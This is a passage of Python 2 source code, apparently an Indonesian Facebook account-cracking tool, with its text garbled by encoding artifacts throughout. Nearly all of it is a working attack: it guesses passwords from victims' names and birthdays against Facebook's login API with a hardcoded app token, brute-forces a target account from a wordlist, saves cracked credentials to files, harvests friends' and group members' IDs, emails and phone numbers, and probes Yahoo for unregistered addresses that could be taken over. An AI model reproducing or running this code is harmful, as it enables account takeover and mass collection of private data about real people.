            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +- username +- '&locale=en_US&password=' +- passw +- '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Berhasil.txt', 'w')
                bisa.write(username +- ' | ' +- passw +- '+AFw-n')
                bisa.close()
                berhasil.append('+AFw-x1b[1;97m[+AFw-x1b[1;92m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;97m] ' +- username +- ' | ' +- passw)
                back +-= 1
            else:
                if 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('Cekpoint.txt', 'w')
                    cek.write(username +- ' | ' +- passw +- '+AFw-n')
                    cek.close()
                    cekpoint.append('+AFw-x1b[1;97m[+AFw-x1b[1;93m+AFw-xe2+AFw-x9c+AFw-x9a+AFw-x1b[1;97m] ' +- username +- ' | ' +- passw)
                    back +-= 1
                else:
                    gagal.append(username)
                    back +-= 1
            sys.stdout.write('+AFw-r+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-xb8+AFw-x1b[1;91m] +AFw-x1b[1;92mCrack    +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- str(back) +- ' +AFw-x1b[1;96m>+AFw-x1b[1;97m ' +- str(len(up)) +- ' =>+AFw-x1b[1;92mLive+AFw-x1b[1;91m:+AFw-x1b[1;96m' +- str(len(berhasil)) +- ' +AFw-x1b[1;97m=>+AFw-x1b[1;93mCheck+AFw-x1b[1;91m:+AFw-x1b[1;96m' +- str(len(cekpoint)))
            sys.stdout.flush()

    except IOError:
        print '+AFw-n+AFw-x1b[1;91m[!] Connection busy'
        time.sleep(0.01)
    except requests.exceptions.ConnectionError:
        print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] No connection'


def hasil():
    print
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    for b in berhasil:
        print b

    for c in cekpoint:
        print c

    print
    print '+AFw-x1b[31m[x] Failed +AFw-x1b[1;97m--> ' +- str(len(gagal))
    keluar()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    print '+JVE--> +AFw-x1b[1;37;40m1. Crack from Friends'
    print '+JVE--> +AFw-x1b[1;37;40m2. Crack from Group'
    print '+JVE--> +AFw-x1b[1;37;40m3. Crack from File'
    print '+JVE--> +AFw-x1b[1;31;40m0. Kembali'
    print '+AFw-x1b[1;37;40m+JVE'
    pilih_super()


def pilih_super():
    peak = raw_input('+JVolUABc-x1b[1;91m+JbYAXA-x1b[1;97m ')
    if peak == '':
        print '+AFw-x1b[1;91m[!] Can+AFw't empty'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            jalan('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mMengambil id Teman +AFw-x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' +- toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
                idg = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mID Group   +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' +- idg +- '&access_token=' +- toket)
                    asw = json.loads(r.text)
                    print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName grup +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- asw['name']
                except KeyError:
                    print '+AFw-x1b[1;91m[!] Group not found'
                    raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                    super()

                re = requests.get('https://graph.facebook.com/' +- idg +- '/members?fields=name,id&limit=999999999&access_token=' +- toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])
                    
            else:
                if peak == '3':
                    os.system('clear')
                    print logo
                    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
                    try:
                        idlist = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFile ID  +AFw-x1b[1;91m: +AFw-x1b[1;97m')
                        for line in open(idlist,'r').readlines():
                        	id.append(line.strip())
                    except IOError:
                        print '+AFw-x1b[1;91m[!] File not found'
                        raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                        super()

                else:
                    if peak == '0':
                        menu_hack()
                    else:
                        print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] +AFw-x1b[1;97m' +- peak +- ' +AFw-x1b[1;91mTidak ada'
                        pilih_super()
    print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mTotal ID +AFw-x1b[1;91m: +AFw-x1b[1;97m' +- str(len(id))
    jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mMohon Tunggu +AFw-x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '+AFw-r+AFw-r+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-xb8+AFw-x1b[1;91m] +AFw-x1b[1;92mCrack +AFw-x1b[1;97m' +- o,
        sys.stdout.flush()
        time.sleep(0.01)

    print
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'

    def main(arg):
        user = arg
        try:
                a = requests.get('https://graph.facebook.com/' +- user +- '/?access_token=' +- toket)
                b = json.loads(a.text)
                pass1 = b['first_name'] +- '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +- user +- '&locale=en_US&password=' +- pass1 +- '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '+AFw-x1b[1;97m+AFw-x1b[1;92m[+JxM]+AFw-x1b[1;97m ' +- user +- ' | ' +- pass1 +- ' --> ' +- b['name']
                else:
                    if 'www.facebook.com' in q['error_msg']:
                        print '+AFw-x1b[1;97m+AFw-x1b[1;93m[+-]+AFw-x1b[1;97m ' +- user +- ' | ' +- pass1 +- ' --> ' +- b['name']
                    else:
                            pass2 = b['firs_name'] +- '12345'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +- user +- '&locale=en_US&password=' +- pass2 +- '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '+AFw-x1b[1;97m+AFw-x1b[1;92m[+JxM]+AFw-x1b[1;97m ' +- user +- ' | ' +- pass2 +- ' --> ' +- b['name']
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '+AFw-x1b[1;97m+AFw-x1b[1;93m[+-]+AFw-x1b[1;97m ' +- user +- ' | ' +- pass2 +- ' --> ' +- ['name']
                                else:
                                        pass3 = b['last_name'] +- '123'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +- user +- '&locale=en_US&password=' +- pass3 +- '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '+AFw-x1b[1;97m+AFw-x1b[1;92m[+JxM]+AFw-x1b[1;97m ' +- user +- ' | ' +- pass3 +- ' --> ' +- b['name']
                                        else:
                                            if 'www.facebook.com' in q['error_msg']:
                                                print '+AFw-x1b[1;97m+AFw-x1b[1;93m[+-]+AFw-x1b[1;97m ' +- user +- ' | ' +- pass3 +- ' --> ' +- b['name']
                                            else:
						    pass4 = b['last_name'] +- '12345'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +- user +- '&locale=en_US&password=' +- pass4 +- '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '+AFw-x1b[1;97m+AFw-x1b[1;92m[+JxM]+AFw-x1b[1;97m ' +- user +- ' | ' +- pass4 +- ' --> ' +- b['name']
                				    else:
                                                        if 'www.facebook.com' in q['error_msg']:
                                                            print '+AFw-x1b[1;97m+AFw-x1b[1;93m[+-]+AFw-x1b[1;97m ' +- user +- ' | ' +- pass4 +- ' --> ' +- b['name']
                    					else:
                                                                birthday = b['birthday']
                                                                pass5 = birthday.replace('/', '')
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +- user +- '&locale=en_US&password=' +- pass5 +- '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                q = json.load(data)
                                                                if 'access_token' in q:
                                                                    print '+AFw-x1b[1;97m+AFw-x1b[1;92m[+JxM]+AFw-x1b[1;97m ' +- user +- ' | ' +- pass5 +- ' --> ' +- b['name']
                                                                else:
                                                                    if 'www.facebook.com' in q['error_msg']:
                                                                        print '+AFw-x1b[1;97m[+AFw-x1b[1;93m[+-]+AFw-x1b[1;97m ' +- user +- ' | ' +- pass5 +- ' --> ' +- b['name']
                                                                    else:
                                                                            pass6 = ('sayang')
                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +- user +- '&locale=en_US&password=' +- pass6 +- '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                            q = json.load(data)
                                                                            if 'access_token' in q:
                                                                                print '+AFw-x1b[1;97m+AFw-x1b[1;92m[+JxM]+AFw-x1b[1;97m ' +- user +- ' | ' +- pass6 +- ' --> ' +- b['name']
                                                                            else:
                                                                                if 'www.facebook.com' in q['error_msg']:
                                                                                    print '+AFw-x1b[1;97m+AFw-x1b[1;93m[+-]+AFw-x1b[1;97m ' +- user +- ' | ' +- pass6 +- ' --> ' +- b['name']

        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '+AFw-n+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mSelesai'
    raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mKembali +AFw-x1b[1;91m]')
    super()


def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '+JVQ' +- 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        try:
            email = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mID+AFw-x1b[1;97m/+AFw-x1b[1;92mEmail+AFw-x1b[1;97m/+AFw-x1b[1;92mHp +AFw-x1b[1;97mTarget +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
            passw = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mWordlist +AFw-x1b[1;97mext(list.txt) +AFw-x1b[1;91m: +AFw-x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mTarget +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- email
            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mTotal+AFw-x1b[1;96m ' +- str(len(total)) +- ' +AFw-x1b[1;92mPassword'
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('+AFw-n', '')
                    sys.stdout.write('+AFw-r+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-xb8+AFw-x1b[1;91m] +AFw-x1b[1;92mTry +AFw-x1b[1;97m' +- pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +- email +- '&locale=en_US&password=' +- pw +- '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email +- ' | ' +- pw +- '+AFw-n')
                        dapat.close()
                        print '+AFw-n+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFounded.'
                        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
                        print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mUsername +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- email
                        print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mPassword +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email +- ' | ' +- pw +- '+AFw-n')
                            ceks.close()
                            print '+AFw-n+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFounded.'
                            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
                            print '+AFw-x1b[1;91m[!] +AFw-x1b[1;93mAccount Maybe Checkpoint'
                            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mUsername +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- email
                            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mPassword +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '+AFw-x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '+AFw-x1b[1;91m[!] File not found...'
            print '+AFw-n+AFw-x1b[1;91m[!] +AFw-x1b[1;92mSepertinya kamu tidak memiliki wordlist'
            tanyaw()


def tanyaw():
    why = raw_input('+AFw-x1b[1;91m[?] +AFw-x1b[1;92mKamu ingin membuat  wordlist ? +AFw-x1b[1;92m[y/t]+AFw-x1b[1;91m:+AFw-x1b[1;97m ')
    if why == '':
        print '+AFw-x1b[1;91m[!] Mohon Pilih +AFw-x1b[1;97m(y/t)'
        tanyaw()
    else:
        if why == 'y':
            wordlist()
        else:
            if why == 'Y':
                wordlist()
            else:
                if why == 't':
                    menu_hack()
                else:
                    if why == 'T':
                        menu_hack()
                    else:
                        print '+AFw-x1b[1;91m[!] Mohon Pilih +AFw-x1b[1;97m(y/t)'
                        tanyaw()


def menu_yahoo():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    print '+JVE--> +AFw-x1b[1;37;40m1. From Friends'
    print '+JVE--> +AFw-x1b[1;37;40m2. From File'
    print '+JVE--> +AFw-x1b[1;31;40m0. Back'
    print '+AFw-x1b[1;37;40m+JVE'
    yahoo_pilih()


def yahoo_pilih():
    go = raw_input('+JVolUABc-x1b[1;91m+JbYAXA-x1b[1;97m ')
    if go == '':
        print '+AFw-x1b[1;91m[!] Can+AFw't empty'
        yahoo_pilih()
    else:
        if go == '1':
            yahoofriends()
        else:
            if go == '2':
                yahoolist()
            else:
                if go == '0':
                    menu_hack()
                else:
                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] +AFw-x1b[1;97m' +- go +- ' +AFw-x1b[1;91mTidak Ditemukan'
                    yahoo_pilih()


def yahoofriends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token Tidak Ada'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    mpsh = []
    jml = 0
    jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mMohon Tunggu +AFw-x1b[1;97m...')
    friends = requests.get('https://graph.facebook.com/me/friends?access_token=' +- toket)
    kimak = json.loads(friends.text)
    save = open('MailVuln.txt', 'w')
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    for w in kimak['data']:
        jml +-= 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' +- id +- '?access_token=' +- toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] +AFw-x1b[1;92mEmail +AFw-x1b[1;91m:+AFw-x1b[1;91m ' +- mail +- ' +AFw-x1b[1;97m[+AFw-x1b[1;92m' +- vulnot +- '+AFw-x1b[1;97m]'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail +- '+AFw-n')
                    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
                    print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName  +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- nama
                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mID    +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- id
                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mEmail +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- mail +- ' [+AFw-x1b[1;92m' +- vuln +- '+AFw-x1b[1;97m]'
                    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
                else:
                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] +AFw-x1b[1;92mEmail +AFw-x1b[1;91m:+AFw-x1b[1;91m ' +- mail +- ' +AFw-x1b[1;97m[+AFw-x1b[1;92m' +- vulnot +- '+AFw-x1b[1;97m]'
        except KeyError:
            pass

    print '+AFw-n+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mSelesai'
    print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mSimpan +AFw-x1b[1;91m:+AFw-x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mKembali +AFw-x1b[1;91m]')
    menu_yahoo()


def yahoolist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        files = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFile +AFw-x1b[1;91m: +AFw-x1b[1;97m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            print '+AFw-x1b[1;91m[!] File not found'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            menu_yahoo()

    mpsh = []
    jml = 0
    jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
    save = open('MailVuln.txt', 'w')
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    print '+AFw-x1b[1;91m[?] +AFw-x1b[1;97mStatus +AFw-x1b[1;91m:  +AFw-x1b[1;97mRed[+AFw-x1b[1;92m' +- vulnot +- '+AFw-x1b[1;97m]  Green[+AFw-x1b[1;92m' +- vuln +- '+AFw-x1b[1;97m]'
    print
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('+AFw-n', '')
        jml +-= 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                print '+AFw-x1b[1;91m ' +- mail
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail +- '+AFw-n')
                print '+AFw-x1b[1;92m ' +- mail
            else:
                print '+AFw-x1b[1;91m ' +- mail

    print '+AFw-n+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mFinish'
    print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mSaved +AFw-x1b[1;91m:+AFw-x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
    menu_yahoo()


def grab():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    print '+JVE--> +AFw-x1b[1;37;40m1. Get ID From Friends'
    print '+JVE--> +AFw-x1b[1;37;40m2. Get Friends ID From Friends'
    print '+JVE--> +AFw-x1b[1;37;40m3. Get ID From GRUP'
    print '+JVE--> +AFw-x1b[1;37;40m4. Get Friends Email'
    print '+JVE--> +AFw-x1b[1;37;40m5. Get Friends Email From Friends'
    print '+JVE--> +AFw-x1b[1;37;40m6. Get Phone From Friends'
    print '+JVE--> +AFw-x1b[1;37;40m7. Get Friend+AFw's Phone From Friends'
    print '+JVE--> +AFw-x1b[1;31;40m0. Back'
    print '+AFw-x1b[1;37;40m+JVE'
    grab_pilih()


def grab_pilih():
    cuih = raw_input('+JVolUABc-x1b[1;91m+JbYAXA-x1b[1;97m ')
    if cuih == '':
        print '+AFw-x1b[1;91m[!] Can+AFw't empty'
        grab_pilih()
    else:
        if cuih == '1':
            id_friends()
        else:
            if cuih == '2':
                idfrom_friends()
            else:
                if cuih == '3':
                    id_member_grup()
                else:
                    if cuih == '4':
                        email()
                    else:
                        if cuih == '5':
                            emailfrom_friends()
                        else:
                            if cuih == '6':
                                nomor_hp()
                            else:
                                if cuih == '7':
                                    hpfrom_friends()
                                else:
                                    if cuih == '0':
                                        menu_hack()
                                    else:
                                        print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] +AFw-x1b[1;97m' +- cuih +- ' +AFw-x1b[1;91mnot found'
                                        grab_pilih()


def id_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')

        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' +- toket)
            z = json.loads(r.text)
            save_id = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mSave File +AFw-x1b[1;97mext(file.txt) +AFw-x1b[1;91m: +AFw-x1b[1;97m')
            bz = open(save_id, 'w')
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            for ah in z['data']:
                idfriends.append(ah['id'])
                bz.write(ah['id'] +- '+AFw-n')
                print '+AFw-r+AFw-x1b[1;92mName+AFw-x1b[1;91m  :+AFw-x1b[1;97m ' +- ah['name']
                print '+AFw-x1b[1;92mID   +AFw-x1b[1;91m : +AFw-x1b[1;97m' +- ah['id']
                print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'

            print '+AFw-n+AFw-r+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mTotal ID +AFw-x1b[1;96m%s' % len(idfriends)
            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mFile Disimpan +AFw-x1b[1;91m: +AFw-x1b[1;97m' +- save_id
            bz.close()
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mKembali +AFw-x1b[1;91m]')
            grab()
        except IOError:
            print '+AFw-x1b[1;91m[!] Error when creating file'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mKembali +AFw-x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '+AFw-x1b[1;91m[!] Stopped'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mKembali +AFw-x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(save_id)
            print '+AFw-x1b[1;91m[!] An error occurred'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mKembali +AFw-x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] No connection'
            keluar()


def idfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            idt = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mInput ID Friends +AFw-x1b[1;91m: +AFw-x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' +- idt +- '?access_token=' +- toket)
                op = json.loads(jok.text)
                print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mFrom+AFw-x1b[1;91m :+AFw-x1b[1;97m ' +- op['name']
            except KeyError:
                print '+AFw-x1b[1;91m[!] Not be friends'
                raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                grab()

            r = requests.get('https://graph.facebook.com/' +- idt +- '?fields=friends.limit(5000)&access_token=' +- toket)
            z = json.loads(r.text)
            save_idt = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mSimpan File +AFw-x1b[1;97mext(file.txt) +AFw-x1b[1;91m: +AFw-x1b[1;97m')
            bz = open(save_idt, 'w')
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mMohon Tunggu +AFw-x1b[1;97m...')
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            for ah in z['friends']['data']:
                idfromfriends.append(ah['id'])
                bz.write(ah['id'] +- '+AFw-n')
                print '+AFw-r+AFw-x1b[1;92mName+AFw-x1b[1;91m  :+AFw-x1b[1;97m ' +- ah['name']
                print '+AFw-x1b[1;92mID   +AFw-x1b[1;91m : +AFw-x1b[1;97m' +- ah['id']
                print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'

            print '+AFw-n+AFw-r+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mTotal ID +AFw-x1b[1;96m%s' % len(idfromfriends)
            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mFile Disimpan +AFw-x1b[1;91m: +AFw-x1b[1;97m' +- save_idt
            bz.close()
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mKembali +AFw-x1b[1;91m]')
            grab()
        except IOError:
